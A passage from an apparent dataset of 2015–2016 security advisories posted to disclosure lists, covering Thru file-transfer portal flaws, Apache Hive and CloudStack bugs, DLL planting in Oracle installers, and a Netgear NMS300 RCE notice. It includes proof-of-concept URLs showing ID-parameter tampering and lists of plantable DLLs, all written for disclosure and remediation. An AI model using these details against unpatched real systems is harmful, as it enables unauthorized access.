AFseXLax53dJTujF1iQQnGGUWpeRCyVyW3MA0EjsEZ2eXZGd/q+dh89I/Onifk3o
VtWpmhx62d88xJ4xOwL9kPB/+5xDXiXAvnGl34lc7SApC+EzAs5bbAfpQmqtzWj5
MopK90uxDl9W1XXtFR3f9By6o63jvOIbt0TqhszZPR6YEpsNfbbApsLxFNVNrGRU
E1Mc+ELd8s/g1tf3NCgxKXjSwebpzhvHZDhgJ3DWaFdJLzqu2gw504omOfPaHDBj
x3whtIeEAJxiIaRJ415T021bR6Cfut32dE6Mw8ybgf9YiuLBBYIpMAU1QwZIT3k9
q4lQAb7wiIrbZTvuFcI/hI2tTvzXE2gwVm3jxCC05tHwiCfujfx5ZsIXdj6Qe0XD
HooUKSqncu1LUoFsUbFZIWcizl+BM4GizIlpw6fpH1xGKpqRG7W9Zdq3+46P5CYm
LrcmrhQdig3o6OqoIiZ2HxQRL0CXvc/vae/ecBS/v5Bm3PlELOnR8Y/Kcya22xsV
CMFFSHtW1e51DoOn9UVm
=iDC3
-----END PGP SIGNATURE-----"
3447,[SYSS-2015-060] Thru Managed File Transfer Portal 9.0.2 - Improperly Implemented Security Check for Standard (CWE-358),CWE-358,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-060
Product: Thru Managed File Transfer Portal
Manufacturer: Thru
Affected Version(s): 9.0.2
Tested Version(s): 9.0.2
Vulnerability Type: Improperly Implemented Security Check for Standard
(CWE-358)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2015-10-28
Solution Date: 2016-01-22
Public Disclosure: 2016-02-15
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Thru Managed File Transfer Portal is a web based file transfer application.
According to the Thru website [1], the application aims to offload large
file transfer to a single platform, to protect files, to replace FTP
servers and to allow access to files anytime, anywhere.
The Thru Managed File Transfer application allows both unauthenticated
and authenticated users to upload files, including viruses.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified that the application promises users that ""all
files are automatically scanned for viruses."" However, it was possible
to upload and download the EICAR test virus, which is recognised by all
virus scanners.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The EICAR test virus was uploaded using the upload functionality. The
upload was successful both as unauthorized and authorized user.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerability has been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-10-26: Vulnerability discovered
2015-10-28: Vulnerability reported to manufacturer
2016-01-22: Manufacturer announced update
2016-02-15: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Thru Homepage
http://www.thruinc.com
[2] SySS Security Advisory SYSS-2015-060
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-060.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWwbd+AAoJEAylhje9lv8qldMP/jbQ1VQEgnXhc4y6BwP7CYTR
vf66NmWNmbovJ/ezrfCVLpCsLp+ia3mFB0KacI898X+zqETI7EEAk3LFVQ34CaZ2
a5MC2aHRCfXi1wFQw/nAfd9V88GC78cjcfbgVKKKRWD+VB4xpqtI9OPhTqOGveRa
H2vdMo2OaNumB9lKdhYiWOG4UbQI7JnbF7aOUnOwts4kU07mnO8HhfHeEqTFd02h
F2z8rMdiNuPRaCFRxr4vfymfv/Rx60fKubeeu93OotYSd0wlRIQ3k4c8iK0ksQ3y
N9AkJSFwjxXxzJKaDWzZTB3N56wW0azVFey9fJM8hzU4VwwkffUK62/t5hoZg8dq
2rJE9TIppkFDoMAF792As2nQNlsU7xVuhBiROUUeFzEofMebG0ct8nCzm0LBRK/X
+bGTtCfGIAX36fujbnM/CaJdxaeaAB3vNJHMVurLUPrGkwSUepnSJzCJ/zz3dIR5
U6NVKMOhFqB5CuiRXoQBwyXBKxfgj44jzXym2qnKc7Z+f+4K8hDuzNmM/C00RCrZ
gQTz7029BDdZ5KSsQCY91RQrYOf1yVHf0nwioKfxfORqOi31PsvlYjFueQH/n48H
akzSAaVKXst1DFxfkLmr2QHeC8Zrnz6D+eDY/TcY2j4q0q+x1cvPT+hRj2b6slQl
1Yxx129YkDYyLV18hp31
=j0ZE
-----END PGP SIGNATURE-----"
3448,[SYSS-2015-059] Thru Managed File Transfer Portal 9.0.2 - Insecure Direct Object Reference (CWE-932),CWE-932,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-059
Product: Thru Managed File Transfer Portal
Manufacturer: Thru
Affected Version(s): 9.0.2
Tested Version(s): 9.0.2
Vulnerability Type: Insecure Direct Object Reference (CWE-932)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2015-10-28
Solution Date: 2016-01-22
Public Disclosure: 2016-02-15
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Thru Managed File Transfer Portal is a web based file transfer application.
According to the Thru website [1], the application aims to offload large
file transfer to a single platform, to protect files, to replace FTP
servers and to allow access to files anytime, anywhere.
The Thru Managed File Transfer application allows unauthenticated users
to use the upload functionality that was loaded during an authenticated
session.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the file upload functionality.
If this page was loaded during an authenticated session, the page could
still be rendered and used to upload a file after successfully logging
out.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The vulnerable page was found under the URL:
https://[HOST]/App/BrowserUpload.aspx?folderid=[MYDOCUMENTS-FOLDER-ID]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerability has been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-10-26: Vulnerability discovered
2015-10-28: Vulnerability reported to manufacturer
2016-01-22: Manufacturer announced update
2016-02-15: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Thru Homepage
http://www.thruinc.com
[2] SySS Security Advisory SYSS-2015-059
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-059.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWwbdzAAoJEAylhje9lv8qxbEQAJ96qcaJ3qPWlkzaAzLN8t4P
I24Sti+F0kvUcVILhN4iiJGaFXTZlarBMr854cQkV5EgkmPsoYbGc0reY02OEyx6
tGPvv2oGbFsO9B2vZJsF43DZvQH5ZEYKPRZ+AH2VbcFksvoKm3/bLRoBvRQx5K7b
g8xYKrefTh6+yxwE+h/WUWuQM5NoglQba3gz1QSG8Fs76MqP5YNyu/e6s31m/Cyu
z5jVs2JT5JH4fP1CJEUk80E0YgOIn4qpxR6rfDYZogA98hwnfYdg59FShgQc8C0o
rxqdvRiaW4EORLkd5nn6CAVQPi3IFQ52voxlajnQGVeKK3pnnJOr+GSYaKshbnlz
dnwL8rgcHl//hOR89gYoX0az5hoguDf72q2Pg/+jz/YA4DNnv1fhQHBaa1k4r4ZX
iP0ajkWhEBKOtTOZeWTJDncOoYVrLTXAe1uNejnKWkCVTqmwERdwfzQ2u5K35w2v
5Wj9NO3MpsrBYRL1oa0O/s5kmmQlEWU83M/7R7E/oj3YLK4Aj6iz3eZ7XAm84mnd
ulQRhWqxy/pdPUFnDuR9JqlLbYQbU5M2u9bYmGug5qEmNlvvvNycgT/3vnIpKfm7
QbeSeZcT1fSN1cJh1E9QMS36EXKg4vQVFR7R5Kp5hadWEBPteUVk6x7Yq5Qxjg7E
WX11ysLqnhHSeTzzXarq
=yfXN
-----END PGP SIGNATURE-----"
3449,[SYSS-2015-058] Thru Managed File Transfer Portal 9.0.2 - Insecure Direct Object Reference (CWE-932),CWE-932,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-058
Product: Thru Managed File Transfer Portal
Manufacturer: Thru
Affected Version(s): 9.0.2
Tested Version(s): 9.0.2
Vulnerability Type: Insecure Direct Object Reference (CWE-932)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2015-10-28
Solution Date: 2016-01-22
Public Disclosure: 2016-02-15
CVE Reference: Not yet assigned
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Thru Managed File Transfer Portal is a web based file transfer application.
According to the Thru website [1], the application aims to offload large
file transfer to a single platform, to protect files, to replace FTP
servers and to allow access to files anytime, anywhere.
The Thru Managed File Transfer application allows authenticated users to
access log data, which direct access is prevented by the application.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH identified a vulnerability in the functionality to access
log data concerning transactions. Log data can be accessed by
authenticated users by directly accessing the correct URL.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Available log data could be viewed by accessing the URL
https://[HOST]/App/FileSystemLogDetail.aspx?fileSystemLogID=45
By manipulating the parameter ""fileSystemLogID"", other log data, for
example with fileSystemLogID=4 concerning the /FOLDERS/HOME folder,
could be accessed as well.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerability has been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-10-26: Vulnerability discovered
2015-10-28: Vulnerability reported to manufacturer
2016-01-22: Manufacturer announced update
2016-02-15: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Thru Homepage
http://www.thruinc.com
[2] SySS Security Advisory SYSS-2015-058
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-058.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWwbdMAAoJEAylhje9lv8qA+cP/R9jb0ocFsgxmNPEtNc4t0xT
ZB6+xsmYYrdnrJY4KJfJtuoHHIO14f+cVxMhYUWAV9iSvV3ZlaKfFdyiSGvs+DA8
tOakza2gq1+iYADcK4kbpDc3ndtZ4B7LZU9V+gwxLdiWP1dIW1F0VszZX17qg3lM
YB2xbXE7aCCRHlE6KTWw3vQE+8VeMQBWp6GTQkHtMmy3HdRhSVM8UpaVZHJxIU7R
z9hgsaYCuvWkWJjRtO4+uKMOhahF6/faWNoLFARTc7yvN6HkvMyZNHItY4Tw1G1X
JX83tnoCHu7c9GkYs4fSCcGdp+shThz8f6mqwQa7m2mYUmeyjRCnZFEDqKKijS22
0TnN01Oe9Sjo2ZIr1OMuygEwycmDpHKKnzNgsCKPKxOX+aeWKnbuRE9y8ARf8i0s
tSstvPbPVPezjej3lgru99lsf4TQkqjW3xWLZ+d/stFocJG/MEaxdKGwiai/O7MZ
I4cQhCrB99GJ3c7WVIPuZSQxHEaZLKKvuT5ymuNG5RHvjy/J/3JEgk7DazSuKv+/
Uz9WDaPgIGZZKDc9YhnEbI4Z/FiN40tOhPbr7w91uqLJUn6XFq0YQP+520I4n+bN
uoTsAVNvN/x9XaMW4Ro4cqCg/UkmT42W/V2irtbW4Dx8UWuNG6eA+1eoiB6SAhiy
Wo31sWCU8sWaC+RvfSDT
=omXs
-----END PGP SIGNATURE-----"
3462,CVE-2015-7521: Apache Hive authorization bug disclosure (update),,CVE-2015-7521,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2015-7521: Apache Hive authorization bug disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Hive 0.13.x
Apache Hive 0.14.x
Apache Hive 1.0.0 - 1.0.1
Apache Hive 1.1.0 - 1.1.1
Apache Hive 1.2.0 - 1.2.1
Description:
Some partition-level operations exist that do not explicitly also
authorize privileges of the parent table. This can lead to issues when
the parent table would have denied the operation, but no denial occurs
because the partition-level privilege is not checked by the
authorization framework, which defines authorization entities only
from the table level upwards.
This issue is known to affect Hive clusters protected by both Ranger
as well as SqlStdHiveAuthorization.
Mitigation:
For Hive 0.13.x, 0.14.x, 1.0, 1.1 and 1.2, a separate jar is being made available,
which users can put in their ${HIVE_HOME}/lib/, and this provides a hook for
administrators to add to their hive-site.xml, by setting
hive.semantic.analyzer.hook=org.apache.hadoop.hive.ql.parse.ParentTableAuthorizationHook .
This parameter is a comma-separated-list and this hook can be
appended to an existing list if one already exists in the setup. You
will then want to make sure that you protect the
hive.semantic.analyzer.hook parameter from being changed at runtime by
adding it to hive.conf.restricted.list.
This jar and associated source tarball are available for download
over at : https://hive.apache.org/downloads.html
along with their gpg-signed .asc signatures, as well as the md5sums
for verification in the hive-parent-auth-hook/ directory.
This issue has already been patched in all Hive branches that are
affected, and is fixed in the recently released Hive 2.0.0. Hive 2.0.0 and
any future release will not need these mitigation steps.
Credit: This issue was discovered by Olaf Flebbe of science+computing ag.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.5 (GNU/Linux)
iQIVAwUBVsTAYh6tt4FFMLreAQJwiw/+JqSYNXefO6dAckvDke57Hv+TYqB36K06
pQt6JiRBQ1Ov084TkfrDESj9ftIIdxnL4MD8o2wmunSJSL6an6aFFR3uxMjmYDrW
6cTr1noxl3t1WQHVf0oE4aAKCjmYBp+6qtlymt4y//PKNxaVq+8bQ53jArMt78YA
UZHV3ET+9vxQM2uoseh1QbdonFMsNMVFY2SfDiZ9OKk8o5eQuF9XhjJWpNKyboYR
hxQhjCfZxkCcqA6ulG/lhpxjRvaqEN8JwePQfpNxEToTm6Y68PrQbR01ry+MENS2
Q2KQ9H8sr9LQMXM1U+pvf1NUDnEA5m6sWTC7JcLoz/4KP5aLy1yxSAoVKhDF5ewI
7d8ECRFsCtJo64yQzy1k7W6vdkg8wuciVKv86KVYaM926wFK0Lj9VFjxFO2G1AY5
nBDMxgEnGk0AiNb9qa8fnVSsiDTwrvfBglvQlmTawdCeBUBWFaNONvxP+9lohe04
NYZz3FKSUTFaqluijfw+2x+abP+0qbwy3JfnUgTdttXJ8R5Xxlf2vGmlj2mAJYI/
+hwfBgBkVeITQ5YK/wNaI2tr8FSFOitX4np/FtJA860ygGxi9C4P/Sl1Xj97cCJC
HSfZjIOsJ6j11W+DFmI85FE5Pqp042EHq8yqIPrlcKAlmrNT3mtXyrWqdBXjESxs
BXyP9rHZJxo=
=5PjL
-----END PGP SIGNATURE-----"
3492,CVE-2015-0061 and CVE-2015-0063 (MS16-009/MS16-011),,CVE-2015-0061,"Hello everyone,
I've recently released examples on twitter of how to trigger two
security vulnerabilities in Microsoft Internet Explorer. These issue
were discovered last year and reported to Microsoft through ZDI.
Microsoft release security updates to address these issues last Tuesday.
CVE-2016-0061:
https://twitter.com/berendjanwever/status/697819335574843394
CVE-2016-0063:
https://twitter.com/berendjanwever/status/697818121835581441
Both were found through fuzzing inspired by Michal Zalewski's cross_fuzz
http://lcamtuf.blogspot.nl/2011/01/announcing-crossfuzz-potential-0-day-in.html
Cheers,
SkyLined"
3497,"Re: [FD] [CVE-2016-0602, CVE-2016-0603] Executable installers are vulnerable^WEVIL (case 24): Oracle Java 6/7/8 SE and VirtualBox",,CVE-2016-0602,"In 2019 you say huh. Damn future tellers !!! I need to get one of those !!!
--
Jason Hellenthal
JJH48-ARIN
On Feb 5, 2016, at 15:50, Stefan Kanthak <stefan.kanthak nexgo de> wrote:
Hi @ll,
the installers or Oracle's Java 6/7/8 for Windows and VirtualBox for
Windows load and execute several DLLs from their ""application directory"".
* The online installer jxpiinstall.exe:
UXTheme.dll and RASAdHlp.dll plus
(on Windows XP) SetupAPI.dll, HNetCfg.dll and XPSP2Res.dll
(on Windows Vista and above) ProfAPI.dll, Secur32.dll, NTMarta.dll
and Version.dll
* The offline installer jre-8u66-windows-i586.exe:
UXTheme.dll, RASAdHlp.dll, NTMarta.dll, Secur32.dll, WinHTTP.dll,
NetUtils.dll, ProfAPI.dll and WindowsCodecs.dll
* VirtualBox-5.0.12-104815-Win.exe:
UXTheme.dll, MSIHnd.dll and MSI.dll plus
(on Windows XP) SFC_OS.dll, ClbCatQ.dll, XPSP2Res.dll, WS2_32.dll
and WS2Help.dll
(on Windows 7) PropSys.dll, ProfAPI.dll and DWMAPI.dll
For software downloaded with a web browser the application
directory is typically the user's ""Downloads"" directory: see
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html>
and <http://seclists.org/fulldisclosure/2012/Aug/134> for
""prior art"" about this well-known and well-documented vulnerability.
Oracle published an advisory and new installers for Java SE today:
<http://www.oracle.com/technetwork/topics/security/alert-cve-2016-0603-2874360.html>
Oracle published updated versions of VirtualBox on 2019-01-19:
<http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html>
stay tuned
Stefan Kanthak
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/"
3535,"[CVE-2016-0602, CVE-2016-0603] Executable installers are vulnerable^WEVIL (case 24): Oracle Java 6/7/8 SE and VirtualBox",,CVE-2016-0602,"Hi @ll,
the installers or Oracle's Java 6/7/8 for Windows and VirtualBox for
Windows load and execute several DLLs from their ""application directory"".
* The online installer jxpiinstall.exe:
UXTheme.dll and RASAdHlp.dll plus
(on Windows XP) SetupAPI.dll, HNetCfg.dll and XPSP2Res.dll
(on Windows Vista and above) ProfAPI.dll, Secur32.dll, NTMarta.dll
and Version.dll
* The offline installer jre-8u66-windows-i586.exe:
UXTheme.dll, RASAdHlp.dll, NTMarta.dll, Secur32.dll, WinHTTP.dll,
NetUtils.dll, ProfAPI.dll and WindowsCodecs.dll
* VirtualBox-5.0.12-104815-Win.exe:
UXTheme.dll, MSIHnd.dll and MSI.dll plus
(on Windows XP) SFC_OS.dll, ClbCatQ.dll, XPSP2Res.dll, WS2_32.dll
and WS2Help.dll
(on Windows 7) PropSys.dll, ProfAPI.dll and DWMAPI.dll
For software downloaded with a web browser the application
directory is typically the user's ""Downloads"" directory: see
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://blog.acrossecurity.com/2012/02/downloads-folder-binary-planting.html>
and <http://seclists.org/fulldisclosure/2012/Aug/134> for
""prior art"" about this well-known and well-documented vulnerability.
Oracle published an advisory and new installers for Java SE today:
<http://www.oracle.com/technetwork/topics/security/alert-cve-2016-0603-2874360.html>
Oracle published updated versions of VirtualBox on 2019-01-19:
<http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html>
stay tuned
Stefan Kanthak"
3538,CVE-2015-3252: Apache CloudStack VNC authentication issue,,CVE-2015-3252,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2015-3252: Apache CloudStack VNC authentication issue
CVSS v2:
4.3 (AV:N/AC:H/Au:M/C:P/I:P/A:P)
Vendors:
The Apache Software Foundation
Citrix, Inc.
Versions Afffected:
Apache CloudStack 4.4.4, 4.5.1
Description:
Apache CloudStack sets a VNC password unique to each KVM virtual
machine under management. Upon migrating a VM from one host to
another, the VNC password is no longer set in KVM on the new host.
To leverage this issue, an attacker would need to have network
access to a CloudStack host to be able to connect via VNC directly.
Mitigation:
Users of Apache CloudStack and derivatives should ensure their hosts
are behind network firewalls, and should update to least version
4.5.2 or 4.6.0, depending on which tree is being used.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
Comment: GPGTools - http://gpgtools.org
iQIcBAEBCgAGBQJWs/dCAAoJELAo8zo1KBbtsX8QAMf2s9OIY3FTbMbTIo/LBmLa
rOOE46SBcmypN1TCHKW0K9etymieI58CPX9LHNdtZcAMa1khl4uo/Euz0wGu0zZZ
awXahXEKUkLSTQDDYJP+8TmKvnIan/mYXRvPEHi2bMCtQ+CjY5qvcge9wXpFDKty
B3LP9n/zYDkQCvBLmjPuqIM+B4JXT9q/e3LsVQHrjhBxheY26CMrSRZ/aLxmzxbh
SSNs4oMZhLEPHoSt/lWsHYd/HxJ/eEjyQunP0UpO5d5/RZypYllPHcbaFPqtC4uK
55VB3JGyPiSEpxbbWEAqrPlOwCU9yNhRXnjdf3gc360NtdjncY1R49+VvUc6C+6u
FqPmy5LFja5uQ1w6/VDdwoT9GeBL9rooMFsLgRpv+FCKPYEtvvIbvot45xA5TCAi
MoU7RjYZoWHTmXLYcQOSSzFnySjLVqdrIL6fgu4gpehB/Od+sV+dwaKM/l03Ml8S
mTerjUNkG2e+pNuWk703aLv4YrKv63T2ga8Nli00BYSyzsxDupd+0XmBzvsLPCMY
uEbxBVVFSpIJMtTacBNgRQGFEQVh+DxPgDaXoZ6RFU/QKVZuWAq85qVEcbDjf8bM
0C6D3f5uXaFaXm4ff1FZ/s/4YOj4rm5EyawrM+Me218+PKMJPHzvsL8y10GCj1T8
s1S77QqgKhqFc+98Z1m3
=OY+T
-----END PGP SIGNATURE-----"
3539,CVE-2015-3251: Apache CloudStack VM Credential Exposure,,CVE-2015-3251,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2015-3251: Apache CloudStack VM Credential Exposure
CVSS v2:
6.0 (AV:N/AC:M/Au:S/C:P/I:P/A:P)
Vendors:
The Apache Software Foundation
Citrix, Inc.
Versions Afffected:
Apache CloudStack 4.4.4, 4.5.1
Description:
Apache CloudStack provides an API for managing network, compute,
storage, and user aspects of a CloudStack cloud. Under certain
circumstances, the results of certain API calls may expose the root
password for a virtual machine related to an API call.
This exposure only happens when the API calls of concern are
authenticated with CloudStack's ""root"" or ""domain administrator""
level users.
Mitigation:
Users of Apache CloudStack should update to at least 4.5.2 or 4.6.0.
Additionally ensure non-administrative users do not have root or
domain-administrator level accounts.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
Comment: GPGTools - http://gpgtools.org
iQIcBAEBCgAGBQJWs/YVAAoJELAo8zo1KBbt+wwP/37SL6e157Hil+unxdV2eqIv
swtRKbEAn6EHRU8xbN+nX/CqbRoonNY8xRAh2R3t6qMjvQwma+fNjKYrQRY476Vr
m4pib/zBf10/lvb2oLppMPMDuAA0ri24UCD/iGS+9aRq72nphDudgxAHHySo9xki
MyJM7Pih+2DkBAbBkQfgxq3juIIc6kgTfdQnKDTrCAMqrD5hSAEjWkfdoKdaRBwn
iMnueNcu0TAyUFpFKz/mbKX4K1ZN7CKykhWGzZI3CO5Cze9u7HfbuqI4Dh2YOWIR
94dQHcGUEAg6d4laL/R0k2PsWSKAjhlwrATC7Th1+N4JR67SxskM9zNDpi7qU7zp
DKqXHbgJ32KH1V0jD/aoGFEgsusUzuJ9yNRX3Mr4TVyfPmTzN1w/NtKl/tqJidba
Mxv8KJFTtOY5OnuD01tnoLIUPXxQcw6uS0Zoqg8ns0TqkdTCW5BmnhLfNfIb9dlp
/zYNl/wFKGv68x6YZmWme6bXNg7l1KKYnK0Yb6Po7JX6k94/vAsMTsPkgdGjTq7L
HqdnwvAAiqEloWZe8trrzMqSRdr6TKhSTWqN3yWaMqQEml/VakCDYGrdd+rDdp/P
++zqLsDUXTaTsipYM/e/oipRtRcHa/TXxERMcH0S4R2rId2mk6X2fyHGoar7p/oG
/Ef3ZKcqB6rxdzKYLEV7
=t8DZ
-----END PGP SIGNATURE-----"
3551,[CERT 777024 / CVE-2016-1524/5]: RCE and file download in Netgear NMS300,,CVE-2016-1524,"Hi,
CERT/CC has helped me disclose two vulnerabilities in NETGEAR's
Pro""safe"" Network Management System 300 [1]. Two classical bugs: one
remote code execution via arbitrary file upload and an authenticated
arbitrary file download.
The full advisory can be seen in my repo at [2] and it is also pasted
below. I've also released two Metasploit modules to exploit these
vulnerabilities [3][4].
There is currently no fix for these - do not expose NMS300 to the
Internet! I've decided to release the exploits anyway as CERT's advisory
details how the vulnerability can be exploited.
Regards,
Pedro
[1] https://www.kb.cert.org/vuls/id/777024
[2]
https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt
[3] https://github.com/rapid7/metasploit-framework/pull/6530
[4] https://github.com/rapid7/metasploit-framework/pull/6531
>> Remote code execution / arbitrary file download in NETGEAR ProSafe
Network Management System NMS300
>> Discovered by Pedro Ribeiro (pedrib gmail com), Agile Information
Security (http://www.agileinfosec.co.uk/)
==========================================================================
Disclosure: 04/02/2016 / Last updated: 04/02/2016
>> Background on the affected product:
""NMS300
ProSAFE® Network Management System
Diagnose, control, and optimize your network devices.
